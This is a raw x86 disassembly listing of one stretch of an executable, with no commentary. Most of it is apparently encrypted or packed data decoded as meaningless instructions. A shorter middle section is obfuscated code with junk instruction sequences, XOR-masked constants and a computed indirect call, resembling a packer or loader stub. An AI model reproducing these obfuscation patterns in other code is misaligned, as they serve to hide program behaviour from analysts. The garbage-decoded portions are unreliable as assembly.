  40cd31:	add    al,0x8e
  40cd33:	pop    eax
  40cd34:	outs   dx,BYTE PTR ds:[esi]
  40cd35:	mov    eax,0xc8474d22
  40cd3a:	rcr    BYTE PTR [edx+0x6],1
  40cd3d:	fsubr  QWORD PTR [edx-0xd]
  40cd40:	adc    DWORD PTR [eax],eax
  40cd42:	loopne 0x40ccf6
  40cd44:	fldenv [ebp+0x18301d4c]
  40cd4a:	dec    edi
  40cd4b:	and    eax,0xe525d6ed
  40cd50:	jge    0x40cd6d
  40cd52:	add    ebx,DWORD PTR [edi-0x1c]
  40cd55:	mov    WORD PTR [ebp+0x34],fs
  40cd58:	lods   al,BYTE PTR ds:[esi]
  40cd59:	stos   DWORD PTR es:[edi],eax
  40cd5a:	mov    BYTE PTR [esi+esi*2-0x25],cl
  40cd5e:	loop   0x40cd61
  40cd60:	xchg   DWORD PTR ds:0x372cd6dd,eax
  40cd66:	pop    esp
  40cd67:	and    eax,0x1036ebdf
  40cd6c:	(bad)  
  40cd6d:	ret    
  40cd6e:	jmp    0x40cd3f
  40cd70:	arpl   cx,ax
  40cd72:	dec    eax
  40cd73:	cmp    eax,0x2d8ec0a3
  40cd78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd79:	push   ecx
  40cd7a:	cmp    al,0x5
  40cd7c:	adc    ebp,DWORD PTR [edi+edi*1+0x17]
  40cd80:	jb     0x40cd1d
  40cd82:	xchg   ebx,eax
  40cd83:	mov    cl,0x60
  40cd85:	cld    
  40cd86:	sub    ebp,DWORD PTR [edx]
  40cd88:	icebp  
  40cd89:	mov    dh,0x1a
  40cd8b:	jp     0x40cd9a
  40cd8d:	rcl    DWORD PTR [ecx-0x31],cl
  40cd90:	jno    0x40cd9b
  40cd92:	pop    es
  40cd93:	sub    eax,0x64d72aac
  40cd98:	jno    0x40cda8
  40cd9a:	xchg   ebp,eax
  40cd9b:	sbb    al,0x3f
  40cd9d:	mov    bl,BYTE PTR [edx+0x579ee6b7]
  40cda3:	pop    ds
  40cda4:	ss nop
  40cda6:	jae    0x40cd55
  40cda8:	xchg   ecx,eax
  40cda9:	mov    cl,0xbf
  40cdab:	cdq    
  40cdac:	std    
  40cdad:	or     BYTE PTR [edi+0x595b8aa7],ch
  40cdb3:	je     0x40cdf7
  40cdb5:	call   0xa0fef997
  40cdba:	sub    eax,0xfee00f9f
  40cdbf:	inc    edi
  40cdc0:	pop    edx
  40cdc2:	push   ebp
  40cdc3:	js     0x40cdb7
  40cdc5:	xlat   BYTE PTR ds:[ebx]
  40cdc6:	xchg   esp,eax
  40cdc7:	fwait
  40cdc8:	mov    bl,0x4f
  40cdca:	loope  0x40cdae
  40cdcc:	out    dx,al
  40cdcd:	stos   DWORD PTR es:[edi],eax
  40cdce:	pop    eax
  40cdcf:	inc    ebp
  40cdd0:	push   es
  40cdd1:	xchg   esi,eax
  40cdd2:	mov    ebx,0xc9c2104f
  40cdd7:	xchg   DWORD PTR [ecx+ecx*4+0x5c],eax
  40cddb:	push   ds
  40cddc:	ins    BYTE PTR es:[edi],dx
  40cddd:	bound  ebx,QWORD PTR [ebp+0x29]
  40cde0:	add    DWORD PTR [edx-0x1f],0x8f4ba7f1
  40cde7:	aad    0x94
  40cde9:	pop    ds
  40cdea:	push   ecx
  40cdeb:	add    al,0xbe
  40cded:	push   ecx
  40cdee:	pop    ebp
  40cdef:	out    0xd8,al
  40cdf1:	(bad)  
  40cdf2:	in     al,dx
  40cdf3:	add    ebx,DWORD PTR [edx-0x1f]
  40cdf6:	fidiv  DWORD PTR [ebx]
  40cdf8:	(bad)  
  40cdf9:	cli    
  40cdfa:	sbb    eax,0x7902e7b8
  40cdff:	cmp    eax,0x5808c686
  40ce04:	dec    esp
  40ce05:	test   BYTE PTR [esi],ch
  40ce07:	push   ds
  40ce08:	in     al,dx
  40ce09:	ret    
  40ce0a:	pop    ecx
  40ce0b:	scas   al,BYTE PTR es:[edi]
  40ce0c:	or     BYTE PTR [ecx-0x6ccfd2d2],0xa
  40ce13:	nop
  40ce14:	jb     0x40cda1
  40ce16:	jmp    0xc331:0x223f9810
  40ce1d:	add    esp,ecx
  40ce1f:	jno    0x40ce93
  40ce21:	add    BYTE PTR [ebp+0x3],ah
  40ce24:	push   0x9b8ae3de
  40ce29:	(bad)  
  40ce2a:	jmp    0x4e0a36e1
  40ce2f:	je     0x40ce8f
  40ce31:	mov    es:0xfee0dea,eax
  40ce37:	call   0x7c777480
  40ce3c:	psubw  mm5,QWORD PTR [ebx]
  40ce3f:	mov    ds,ecx
  40ce41:	push   esp
  40ce42:	xchg   DWORD PTR ds:0x467ad43e,esi
  40ce48:	jne    0x40ce72
  40ce4a:	pop    edi
  40ce4b:	jne    0x40ce48
  40ce4d:	pop    esi
  40ce4e:	loope  0x40ce76
  40ce50:	std    
  40ce51:	adc    eax,0x446d824b
  40ce56:	in     eax,0xac
  40ce58:	mov    bl,0x95
  40ce5a:	loop   0x40ce1a
  40ce5c:	inc    ebx
  40ce5d:	xchg   esp,eax
  40ce5e:	loop   0x40ce44
  40ce60:	js     0x40cecf
  40ce62:	popa   
  40ce63:	call   0x672:0x60e6e459
  40ce6a:	or     eax,0xc5e8a016
  40ce6f:	scas   al,BYTE PTR es:[edi]
  40ce70:	push   0x7b3b838f
  40ce75:	pop    esi
  40ce76:	pop    esp
  40ce77:	sar    bh,cl
  40ce79:	and    al,0xf3
  40ce7b:	(bad)  
  40ce7c:	rcl    BYTE PTR [ebx],1
  40ce7e:	inc    edx
  40ce7f:	pop    eax
  40ce80:	dec    edx
  40ce81:	xor    DWORD PTR [ecx],edi
  40ce83:	add    eax,0xfa3b2803
  40ce88:	out    0x87,eax
  40ce8a:	call   0x3f2:0xc12f3491
  40ce91:	ror    DWORD PTR [ebx],1
  40ce93:	in     al,0x17
  40ce95:	push   edi
  40ce96:	mov    bh,0x24
  40ce98:	adc    BYTE PTR [ecx-0x5f88dc39],ah
  40ce9e:	pop    ebx
  40ce9f:	ss inc edx
  40cea1:	daa    
  40cea2:	cmp    cl,BYTE PTR [edi-0x15]
  40cea5:	push   ecx
  40cea6:	xchg   edx,eax
  40cea7:	js     0x40ce5e
  40cea9:	push   esi
  40ceaa:	adc    al,0x28
  40ceac:	cmp    ebp,DWORD PTR [edi-0x7c038645]
  40ceb2:	mov    al,0x8e
  40ceb4:	and    esi,DWORD PTR [edi]
  40ceb6:	dec    edx
  40ceb7:	out    dx,al
  40ceb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceb9:	arpl   WORD PTR [esi+0x40],cx
  40cebc:	cld    
  40cebd:	mov    WORD PTR [ebx*8-0x6bcb24a],ss
  40cec4:	ins    BYTE PTR es:[edi],dx
  40cec5:	fsub   DWORD PTR [eax]
  40cec7:	sub    eax,0x978c3385
  40cecc:	fmul   DWORD PTR [edx+0x544cf6cf]
  40ced2:	fwait
  40ced3:	inc    esi
  40ced4:	jmp    0x40ceab
  40ced6:	jge    0x40cf30
  40ced8:	in     al,0xa3
  40ceda:	gs inc esp
  40cedc:	daa    
  40cedd:	jmp    0x40cefc
  40cedf:	retf   
  40cee0:	adc    eax,DWORD PTR [ebp+0x43]
  40cee3:	mov    esi,0xcca00074
  40cee8:	or     eax,0x9d56edc7
  40ceed:	cmp    BYTE PTR [eax],ah
  40ceef:	pop    ebx
  40cef0:	cmc    
  40cef1:	fnsave [edx+0x21]
  40cef4:	in     eax,dx
  40cef5:	les    esp,FWORD PTR [eax+0x3bd77b96]
  40cefb:	(bad)  
  40cefd:	xor    ch,dh
  40ceff:	pusha  
  40cf00:	pop    edx
  40cf01:	ins    BYTE PTR es:[edi],dx
  40cf02:	fadd   DWORD PTR [ebp+eax*4-0x481b0364]
  40cf09:	ret    0x8ce0
  40cf0c:	bound  ebp,QWORD PTR [edx+edi*4-0x54bc6db9]
  40cf13:	adc    ecx,DWORD PTR ds:0xd06e8949
  40cf19:	shl    DWORD PTR [edi-0x220c21a],1
  40cf1f:	arpl   ax,si
  40cf21:	pop    ecx
  40cf22:	push   cs
  40cf23:	sbb    DWORD PTR [edi-0x7b],edx
  40cf26:	es cld 
  40cf28:	jle    0x40cf02
  40cf2a:	jae    0x40cf5a
  40cf2c:	pop    ebp
  40cf2d:	pop    edi
  40cf2e:	add    DWORD PTR [edi+edx*4+0x2e6f6078],edx
  40cf35:	adc    ecx,DWORD PTR [bp+di+0x48]
  40cf39:	mov    cl,0x73
  40cf3b:	mov    edx,0x770cc9c2
  40cf40:	fcmovnb st,st(6)
  40cf42:	jecxz  0x40cf6a
  40cf44:	mov    ecx,ebx
  40cf46:	pop    esi
  40cf47:	and    edi,ebp
  40cf49:	or     eax,0xc9ee20b4
  40cf4e:	add    eax,0xd3db4bf1
  40cf53:	inc    esp
  40cf54:	es (bad) 
  40cf56:	adc    eax,0xeb7718f1
  40cf5b:	shl    ebp,cl
  40cf5d:	mov    esp,0x2583663
  40cf62:	push   ebx
  40cf63:	mov    WORD PTR [eax],?
  40cf65:	shl    DWORD PTR [ecx+edi*8-0x3d11c0e0],cl
  40cf6c:	or     DWORD PTR [edi],ebp
  40cf6e:	pop    ebp
  40cf6f:	jno    0x40cefd
  40cf71:	out    0x73,eax
  40cf73:	pop    ss
  40cf74:	mov    ch,0x20
  40cf76:	inc    edi
  40cf77:	shl    dh,0x6c
  40cf7a:	icebp  
  40cf7b:	push   0xffffffd5
  40cf7d:	retf   
  40cf7e:	shl    DWORD PTR [ebp-0x5dbb4a30],cl
  40cf84:	jge    0x40cf9a
  40cf86:	xor    ecx,DWORD PTR [edx]
  40cf88:	addr16 xchg ebx,eax
  40cf8a:	xchg   BYTE PTR [esi],cl
  40cf8c:	sbb    eax,0xe727cc57
  40cf91:	aad    0xcd
  40cf93:	cs push 0xda16a521
  40cf99:	sub    al,0xce
  40cf9b:	fbld   TBYTE PTR [ecx+0x5c]
  40cf9e:	in     eax,0xe5
  40cfa0:	xchg   esi,eax
  40cfa1:	inc    eax
  40cfa2:	std    
  40cfa3:	sub    eax,0x85c8c910
  40cfa8:	sar    DWORD PTR [ebx-0x478e122f],cl
  40cfae:	add    eax,0x4d06a61c
  40cfb3:	inc    ebp
  40cfb4:	inc    ebp
  40cfb5:	test   BYTE PTR [ecx+0x0],dl
  40cfb8:	mov    cl,0xa6
  40cfba:	icebp  
  40cfbb:	lods   eax,DWORD PTR ds:[esi]
  40cfbc:	les    edi,FWORD PTR [ecx]
  40cfbe:	or     bl,bl
  40cfc0:	lahf   
  40cfc1:	push   edi
  40cfc2:	push   es
  40cfc3:	xchg   esp,eax
  40cfc4:	push   eax
  40cfc5:	fsubp  st(0),st
  40cfc7:	and    eax,0x4f246e19
  40cfcc:	adc    eax,0xaa0fc08c
  40cfd1:	adc    eax,0xc0ab8e8f
  40cfd6:	jmp    0x40b71d9c
  40cfdb:	xchg   ebp,eax
  40cfdc:	xchg   cl,cl
  40cfde:	mov    dx,0x42fe
  40cfe2:	jmp    0x40cfe4
  40cfe4:	into   
  40cfe5:	mov    bl,0x63
  40cfe7:	pop    edx
  40cfe8:	pushf  
  40cfe9:	repnz test al,0x83
  40cfec:	push   cs
  40cfed:	sbb    DWORD PTR [edx],edx
  40cfef:	inc    ebp
  40cff0:	jmp    0x50f2:0xff3ad5b5
  40cff7:	xor    ah,BYTE PTR [ebx-0x71acc6a9]
  40cffd:	ss mov eax,?
  40d000:	pop    ebx
  40d001:	(bad)  
  40d002:	or     BYTE PTR [esi-0x715b2771],bh
  40d008:	push   esp
  40d009:	mov    eax,edi
  40d00b:	scas   al,BYTE PTR es:[edi]
  40d00c:	mov    dh,0xf0
  40d00e:	test   DWORD PTR [edx+ebx*2+0x16],ebx
  40d012:	xchg   DWORD PTR [esi-0x7314485e],edx
  40d018:	push   ecx
  40d019:	or     bl,0x32
  40d01c:	call   0x6ba762f4
  40d021:	add    esp,DWORD PTR [edi]
  40d023:	fiadd  DWORD PTR [eax+esi*1+0x49a28031]
  40d02a:	cmp    eax,0x3338f384
  40d02f:	push   eax
  40d030:	vhaddps ymm5,ymm0,YMMWORD PTR [edi+ebx*1+0x41]
  40d036:	out    0x20,al
  40d038:	xchg   edx,eax
  40d039:	or     ch,BYTE PTR [ebx-0x2e3031a6]
  40d03f:	imul   esi,DWORD PTR [bp+si]
  40d043:	mov    BYTE PTR [edi],ah
  40d045:	scas   al,BYTE PTR es:[edi]
  40d046:	jmp    0x40d028
  40d048:	mov    bl,al
  40d04a:	data16 adc al,BYTE PTR [eax-0x503bc358]
  40d051:	dec    ebx
  40d052:	dec    esi
  40d053:	sbb    edi,DWORD PTR [edx+0x38dff8dc]
  40d059:	fs jbe 0x40d079
  40d05c:	mov    bl,0xc
  40d05e:	loopne 0x40d042
  40d060:	mov    cl,BYTE PTR [edx+0x13949ae4]
  40d066:	shl    BYTE PTR [eax-0x46],cl
  40d069:	test   DWORD PTR [ecx+0x1448b10f],ecx
  40d06f:	add    DWORD PTR [ecx],eax
  40d071:	mov    ebp,0x82f6b35b
  40d076:	ret    
  40d077:	cdq    
  40d078:	ins    DWORD PTR es:[edi],dx
  40d079:	dec    ebx
  40d07a:	inc    edx
  40d07b:	gs es push cs
  40d07e:	push   0x75
  40d080:	mov    esi,0x74d70625
  40d085:	popa   
  40d086:	xchg   ecx,eax
  40d087:	jmp    0x86dc4dce
  40d08c:	bnd jmp DWORD PTR [eax]
  40d08f:	dec    ebx
  40d090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d091:	mov    eax,ds:0x432ed198
  40d096:	call   0x7a90:0xed9072ab
  40d09d:	shl    BYTE PTR ds:0x294334b1,0xda
  40d0a4:	stc    
  40d0a5:	inc    ebx
  40d0a6:	fwait
  40d0a7:	mov    ecx,0xe9b093c6
  40d0ac:	and    eax,0xb884e89e
  40d0b1:	inc    ecx
  40d0b2:	fstp   DWORD PTR [edx-0x21]
  40d0b5:	xchg   ecx,eax
  40d0b6:	xchg   ecx,eax
  40d0b7:	mov    edi,ecx
  40d0b9:	sbb    esi,0x605434ec
  40d0bf:	into   
  40d0c0:	cli    
  40d0c1:	pop    ss
  40d0c2:	int    0xfc
  40d0c4:	sub    esp,edi
  40d0c6:	adc    bl,dl
  40d0c8:	or     DWORD PTR [ebx+esi*8+0x1148d8c9],esp
  40d0cf:	sbb    edi,edx
  40d0d1:	sti    
  40d0d2:	sar    BYTE PTR [ebx+0x44],0x38
  40d0d6:	pop    ebp
  40d0d7:	sbb    eax,0x3e5842f6
  40d0dc:	lea    eax,[eax]
  40d0de:	inc    eax
  40d0df:	lock mov esp,0xe015d724
  40d0e5:	jae    0x40d118
  40d0e7:	and    DWORD PTR [esi+0x9],edi
  40d0ea:	gs push ds
  40d0ec:	xchg   edx,eax
  40d0ed:	sti    
  40d0ee:	inc    eax
  40d0ef:	shl    BYTE PTR [ecx+0x5f],0xb3
  40d0f3:	inc    esp
  40d0f4:	push   edi
  40d0f5:	push   es
  40d0f6:	lods   al,BYTE PTR ds:[esi]
  40d0f7:	shr    BYTE PTR [eax-0x27],0xda
  40d0fb:	sbb    al,BYTE PTR [ebx]
  40d0fd:	dec    ecx
  40d0fe:	xchg   edx,edx
  40d100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d101:	mov    BYTE PTR [esi],ah
  40d103:	mov    bh,0xb8
  40d105:	mov    DWORD PTR [ecx+0x3f139ca5],esi
  40d10b:	aaa    
  40d10c:	mov    DWORD PTR [ebp+0x3e3f5ace],ecx
  40d112:	push   eax
  40d113:	mov    dh,0xaa
  40d115:	shl    BYTE PTR [esi],1
  40d117:	(bad)  
  40d118:	jecxz  0x40d0d6
  40d11a:	push   ebp
  40d11b:	and    al,0xfd
  40d11d:	inc    ebp
  40d11e:	or     BYTE PTR [ebx+ecx*2-0xdb0fd7d],cl
  40d125:	aaa    
  40d126:	and    DWORD PTR [ecx+ebx*4-0x73],ecx
  40d12a:	imul   esp,DWORD PTR [ecx],0xffffffa0
  40d12d:	mov    BYTE PTR [ebx-0x7af3d586],ah
  40d133:	ret    0xe18f
  40d136:	or     ah,BYTE PTR [eax+esi*1+0x75e48991]
  40d13d:	call   FWORD PTR ds:0x70757aa8
  40d143:	lods   al,BYTE PTR ds:[esi]
  40d144:	test   al,0xcc
  40d146:	(bad)  
  40d147:	and    al,0xfc
  40d149:	hlt    
  40d14a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d14b:	out    dx,eax
  40d14c:	sub    DWORD PTR [ecx],edi
  40d14e:	nop
  40d14f:	mov    eax,ds:0x11717983
  40d154:	sub    BYTE PTR [esi],dh
  40d156:	jns    0x40d139
  40d158:	enter  0x7221,0xde
  40d15c:	and    cl,BYTE PTR [ecx]
  40d15e:	and    dh,BYTE PTR [eax-0xb]
  40d161:	jg     0x40d17f
  40d163:	add    DWORD PTR [ecx],eax
  40d165:	sub    BYTE PTR [edx+0x7c],0x1f
  40d169:	xor    esi,DWORD PTR [edi+ebp*8-0x2c]
  40d16d:	dec    ebp
  40d16e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d16f:	or     al,0xd1
  40d171:	push   ebx
  40d172:	push   ebp
  40d173:	cmp    DWORD PTR [ebp+0x76],esp
  40d176:	call   0x3dd8e38c
  40d17b:	test   BYTE PTR [edi+0xd],0xf4
  40d17f:	lods   al,BYTE PTR ds:[esi]
  40d180:	enter  0x74c9,0xf2
  40d184:	adc    ecx,DWORD PTR [esi+edi*4+0x64744a92]
  40d18b:	lds    esi,FWORD PTR [edi]
  40d18d:	sbb    al,0x24
  40d18f:	por    mm4,QWORD PTR [ebp-0x2a906f02]
  40d196:	popf   
  40d197:	add    dl,bh
  40d199:	push   es
  40d19a:	adc    eax,0x40109ee
  40d19f:	inc    esi
  40d1a0:	add    eax,0xce275a2d
  40d1a5:	xor    al,0x5c
  40d1a7:	xor    eax,0x6e357e4a
  40d1ac:	push   eax
  40d1ad:	cmp    al,0xbb
  40d1af:	scas   eax,DWORD PTR es:[edi]
  40d1b0:	adc    DWORD PTR [edi-0x8832be],esi
  40d1b6:	xor    bh,BYTE PTR [ecx+0x69]
  40d1b9:	sti    
  40d1ba:	push   ebx
  40d1bb:	and    al,0xc7
  40d1bd:	mov    eax,ds:0xb93e230d
  40d1c2:	push   ebx
  40d1c3:	(bad)  
  40d1c4:	pop    ss
  40d1c5:	pusha  
  40d1c6:	ins    DWORD PTR es:[edi],dx
  40d1c7:	std    
  40d1c8:	xor    BYTE PTR [eax],ah
  40d1ca:	jmp    0xbcc7:0x1ea1e99f
  40d1d1:	push   edx
  40d1d2:	arpl   WORD PTR [ecx-0x48],di
  40d1d5:	retf   
  40d1d6:	clc    
  40d1d7:	jae    0x40d1bc
  40d1d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1da:	pop    ebx
  40d1db:	int3   
  40d1dc:	jbe    0x40d215
  40d1de:	mov    esp,0x35e666ea
  40d1e3:	iret   
  40d1e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1e5:	retf   
  40d1e6:	(bad)  
  40d1e7:	push   ss
  40d1e8:	adc    bl,BYTE PTR [eax+0x3e489a7a]
  40d1ee:	fisttp WORD PTR [eax]
  40d1f0:	push   edx
  40d1f1:	xor    BYTE PTR [eax],dl
  40d1f3:	sbb    ah,dh
  40d1f5:	and    eax,0x5b3e7a52
  40d1fa:	adc    BYTE PTR [esi],al
  40d1fc:	jecxz  0x40d18a
  40d1fe:	push   0x675c2a08
  40d203:	xor    DWORD PTR [edx-0x1c],eax
  40d206:	test   edx,esi
  40d208:	cdq    
  40d209:	adc    ecx,ebp
  40d20b:	mov    esi,0xc51ce058
  40d210:	daa    
  40d211:	aas    
  40d212:	add    DWORD PTR [ebx],ecx
  40d214:	sti    
  40d215:	std    
  40d216:	inc    ebp
  40d217:	sbb    ch,BYTE PTR [edi-0x74]
  40d21a:	iret   
  40d21b:	sub    esp,ebx
  40d21d:	rcl    DWORD PTR [ebp+0xdb5b8fc],0x51
  40d224:	ret    
  40d225:	fcomp  QWORD PTR [esp+eax*4-0x4e]
  40d229:	sahf   
  40d22a:	setle  dh
  40d22d:	loopne 0x40d20f
  40d22f:	outs   dx,BYTE PTR ds:[esi]
  40d230:	cmp    al,ah
  40d232:	or     eax,0x2792f7a9
  40d237:	sub    DWORD PTR [esi-0x11],0x52ac980d
  40d23e:	push   0x37fd48a7
  40d243:	jo     0x40d2b0
  40d245:	push   eax
  40d246:	push   edi
  40d247:	sub    ebx,esp
  40d249:	in     al,dx
  40d24a:	(bad)  
  40d24b:	and    eax,0x98e9a4c4
  40d250:	pop    eax
  40d251:	nop
  40d252:	dec    esp
  40d253:	fmul   QWORD PTR ds:0x63aed652
  40d259:	sub    esi,ebx
  40d25b:	cs mov ah,0xd
  40d25e:	mov    edi,0xf859e32f
  40d263:	data16 aas 
  40d265:	test   eax,0xb97c13c7
  40d26a:	pop    edx
  40d26b:	xchg   ebx,eax
  40d26c:	dec    eax
  40d26d:	les    esi,FWORD PTR [esi+esi*8-0x62]
  40d271:	(bad)  
  40d272:	bound  eax,QWORD PTR [eax+ecx*8-0x2]
  40d276:	daa    
  40d277:	pop    edi
  40d278:	add    BYTE PTR [eax+0x6e],0xba
  40d27c:	ret    
  40d27d:	mov    eax,ds:0x1cd2ff1f
  40d282:	xchg   ebp,eax
  40d283:	pusha  
  40d284:	imul   esi,DWORD PTR [edi-0x65f0c03a],0xce126015
  40d28e:	mov    ch,0x8c
  40d290:	test   eax,0x9b5a58f2
  40d295:	ficom  WORD PTR [esp+edi*4-0x7a1bba75]
  40d29c:	ror    BYTE PTR [edi],0x84
  40d29f:	xchg   esi,eax
  40d2a0:	add    BYTE PTR [eax],al
  40d2a2:	add    bh,al
  40d2a4:	inc    ebp
  40d2a5:	loopne 0x40d2a7
  40d2a7:	add    BYTE PTR [eax],al
  40d2a9:	add    BYTE PTR [edx+0x58],dl
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x430a2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d3f2
  40d43c:	sbb    al,0x7c
  40d43e:	push   edi
  40d43f:	sbb    ch,BYTE PTR [edx]
  40d441:	jnp    0x40d4be
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	inc    eax
  40d448:	xlat   BYTE PTR ds:[ebx]
  40d449:	lock pop ebp
  40d44b:	jmp    0xdb6e:0xd2d23334
  40d452:	fstp   DWORD PTR [ecx]
  40d454:	sbb    BYTE PTR [eax-0x6a959d89],bh
  40d45a:	mov    ecx,0x54de4005
  40d45f:	cmc    
  40d460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d461:	or     eax,0x7f05a4bb
  40d466:	jae    0x40d470
  40d468:	mov    al,0x1f
  40d46a:	adc    eax,0xa561dc89
  40d46f:	std    
  40d470:	mov    eax,0x404c85ec
  40d475:	out    0xfc,al
  40d477:	pop    edi
  40d478:	dec    esi
  40d479:	or     BYTE PTR [edi+eiz*4],bh
  40d47c:	je     0x40d4c9
  40d47e:	jle    0x40d4a8
  40d480:	sar    BYTE PTR [ecx],0xd8
  40d483:	adc    eax,0xed09760a
  40d488:	xchg   DWORD PTR [ecx],edx
  40d48a:	push   ebp
  40d48b:	xchg   edi,eax
  40d48c:	add    ecx,DWORD PTR [edx]
  40d48e:	cli    
  40d48f:	cli    
  40d490:	or     DWORD PTR [edi-0x6d0c9de4],edi
  40d496:	pop    es
  40d497:	mov    esp,0x50178d54
  40d49c:	xchg   esp,eax
  40d49d:	aas    
  40d49e:	rol    BYTE PTR [ecx+0x6b],1
  40d4a1:	ds mov ebx,0x173de55f
  40d4a7:	ins    BYTE PTR es:[edi],dx
  40d4a8:	dec    esp
  40d4a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4aa:	int    0xfd
  40d4ac:	imul   esi,ebp,0x57862bb5
  40d4b2:	mov    ecx,DWORD PTR [esi]
  40d4b4:	sub    eax,0xf80825df
  40d4b9:	and    eax,esp
  40d4bb:	das    
  40d4bc:	icebp  
